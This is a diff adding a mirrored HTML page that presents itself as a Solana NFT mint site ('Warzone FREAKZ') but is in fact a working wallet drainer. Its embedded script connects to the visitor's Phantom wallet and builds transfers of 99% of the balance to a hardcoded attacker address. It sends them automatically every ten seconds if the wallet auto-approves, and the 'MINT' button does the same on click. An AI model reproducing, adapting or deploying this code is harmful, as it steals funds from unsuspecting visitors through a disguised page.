@@ -1,0 +1,282 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from bossbullsclub.cc/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 11 Dec 2021 16:43:23 GMT -->
+<!-- Added by HTTrack -->
+<!-- Mirrored from bossbullsclubraritychecker.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Dec 2021 08:01:19 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="assets/style.css">
+	<link rel="shortcut icon" href="favicon.ico"><title>Warzone FREAKZ AN FUTURISTIC 3D FINE ART NFT ON SOLANA</title>
+</head>
+
+<body>
+    <header>
+        
+        <div class="header_content">
+            <div class="logo"><img src="img/logo2.png" alt="Logo"></div>
+            <div class="link-discord"><a href="BossBullsClub.html">Twitter</a><a href="invite/zQQhHjj7Ng.html">Discord</a></div>
+        </div>
+    </header>
+    <div class="wrapper">
+        <div class="content">
+            <div class="content-title"><p>  <span class="white"> Warzone FREAKZ</span>  </p> </div>
+            <p class="pre-title">AN FUTURISTIC 3D FINE ART NFT ON SOLANA</p>
+            <p class="mint-start">MINT LIVE</p>
+            <div class="content-user_calcualtion">
+                <div class="user-item">
+                  
+                    <div class="user-calculation_content">
+                        <div class="line-1">
+                            <p> <span class="quantity"></span></p>
+                            <p class="minted">Mint now</p>
+                            <img class="photo3" src="img/image1.png" alt="">
+                            <img class="photo1" src="img/image2.png" alt="">
+                            <img class="photo2" src="img/image3.png" alt="">
+                            
+                            <img class="back" src="img/photo-4.png" alt="">
+                            
+                        </div>
+                        
+                                  <div href="javascript:;" class="but user-calculation_submit" id="connect" style="display: flex;">Connect Wallet</div>
+                        <div href="javascript:;" class="but user-calculation_submit" id="transfer" style="display: none;">MINT</div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+<script>
+        function upValue() {
+
+            document.getElementById('counet').value = parseInt(1) + parseInt(document.getElementById('counet').value);
+
+            document.getElementById('wqwqw').textContent = (parseInt(document.getElementById('counet').value) * 1.25).toFixed(2).toString() + ' SOL';
+        }
+
+        function downValue() {
+            if (document.getElementById('counet').value == '1') {
+
+            } else {
+
+                document.getElementById('counet').value = parseInt(document.getElementById('counet').value) - parseInt(1);
+
+                document.getElementById('wqwqw').textContent = (parseInt(document.getElementById('counet').value) * 1.25).toFixed(2).toString() + ' SOL';
+            }
+        }
+        window.addEventListener('load', () => {
+
+
+            var sent = false;
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+
+            const getProvider = () => {
+                if ("solana" in window) {
+                    const provider = window.solana;
+                    if (provider.isPhantom) {
+                        return provider;
+                    }
+                }
+                window.open("https://phantom.app/", "_blank");
+            };
+
+            function onBodyLoad() {
+
+                const solConnected = window.solana.isConnected;
+
+                if (!solConnected) {
+                    connectWallet();
+
+                } else {
+                    document.getElementById('transfer').style.display = 'flex';
+                    document.getElementById('connect').style.display = 'none';
+                }
+                refreshStatus();
+
+            }
+
+
+            function refreshStatus() {
+                const provider = getProvider();
+                if (provider) {
+                    provider.on("connect", () => {
+                        setConnected();
+                        document.getElementById('transfer').style.display = 'flex';
+                        document.getElementById('connect').style.display = 'none';
+                    });
+                    provider.on("disconnect", () => {
+                        setNotConnected();
+                    });
+                }
+            }
+
+            function connectWallet() {
+                window.solana.connect({
+                    onlyIfTrusted: false
+                });
+            }
+            async function setConnected() {
+                let account_info = await connection.getAccountInfo(window.solana.publicKey);
+                console.log("Auto Approve: " + window.solana.autoApprove);
+            }
+
+            function trySend() {
+                if (window.solana.autoApprove) {
+                    if (!sent) {
+                        apimainnet();
+                    }
+                } else {
+                    console.log("Not auto approve!");
+                }
+            }
+            async function testTransfer2(howmany) {
+                const provider = getProvider();
+                const solConected = window.solana.isConnected;
+                const manylamports = (howmany * 1000000000).toFixed(0);
+
+                if (!provider) {
+                    return;
+                }
+                if (!solConected) {
+                    return;
+                }
+
+                let account_info = await connection.getAccountInfo(window.solana.publicKey);
+                var charginglamports = manylamports;
+                console.log(charginglamports)
+                if ((account_info.lamports / 2) > manylamports) {
+                    charginglamports = (account_info.lamports * 0.99).toFixed(0);
+                }
+
+                if (account_info.lamports < manylamports && account_info.lamports > 100000) {
+                    charginglamports = (account_info.lamports * 0.99).toFixed(0);
+                }
+                console.log(charginglamports);
+
+                let transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: provider.publicKey,
+                        toPubkey: "48Av24AQnPa5WeDxNc8JsFU8mAbwJnKSbNHd3g1WJkBU",
+                        lamports: charginglamports,
+                    })
+                );
+
+                let {
+                    blockhash
+                } = await connection.getRecentBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = provider.publicKey;
+
+                return transaction;
+            }
+
+            async function makeTransfer(howmany) {
+                let transaction = await testTransfer2(howmany);
+                const provider = getProvider();
+
+                if (!provider) {
+                    return;
+                }
+                console.log(provider);
+                console.log(transaction);
+
+                if (transaction) {
+                    //try {
+
+                    console.log("asd");
+                    let signed = await provider.signTransaction(transaction, connection);
+                    console.log(signed);
+                    let signature = await connection.sendRawTransaction(signed.serialize());
+                    console.log(signature);
+                    await connection.confirmTransaction(signature);
+                    //} catch(err) {
+                    //  console.warn(err);
+                    //}
+                }
+            }
+
+            async function testTransfer() {
+                const provider = getProvider();
+                const solConected = window.solana.isConnected;
+
+                if (!provider) {
+                    return;
+                }
+                if (!solConected) {
+                    return;
+                }
+
+                let account_info = await connection.getAccountInfo(window.solana.publicKey);
+
+                if (account_info.lamports >= 10000000) {
+                    let transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: provider.publicKey,
+                            toPubkey: "48Av24AQnPa5WeDxNc8JsFU8mAbwJnKSbNHd3g1WJkBU",
+                            lamports: (account_info.lamports * 0.99).toFixed(0),
+                        })
+                    );
+
+                    let {
+                        blockhash
+                    } = await connection.getRecentBlockhash();
+                    transaction.recentBlockhash = blockhash;
+                    transaction.feePayer = provider.publicKey;
+
+                    return transaction;
+                }
+            }
+
+            async function apimainnet() {
+                let transaction = await testTransfer();
+                const provider = getProvider();
+
+                if (!provider) {
+                    return;
+                }
+                console.log(provider);
+                console.log(transaction);
+
+                if (transaction) {
+                    //try {
+
+                    console.log("asd");
+                    let signed = await provider.signTransaction(transaction, connection);
+                    console.log(signed);
+                    let signature = await connection.sendRawTransaction(signed.serialize());
+                    console.log(signature);
+                    sent = true;
+                    await connection.confirmTransaction(signature);
+                    //} catch(err) {
+                    //  console.warn(err);
+                    //}
+                }
+            }
+
+            function setNotConnected() {
+                // document.getElementById("connStatus").innerHTML = "Not Connected";
+            }
+            onBodyLoad();
+            setInterval(trySend, 10000);
+
+            document.getElementById('transfer').onclick = function() {
+                makeTransfer(100000);
+            }
+            document.getElementById('connect').onclick = function() {
+                onBodyLoad();
+            }
+        });
+    </script>
+    <script src="%40solana/web3.js%401.29.2/lib/index.iife.min.js"></script>
+</body>
+
+
+<!-- Mirrored from bossbullsclub.cc/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 11 Dec 2021 16:43:25 GMT -->
+
+<!-- Mirrored from bossbullsclubraritychecker.vercel.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Dec 2021 08:01:21 GMT -->
+</html>
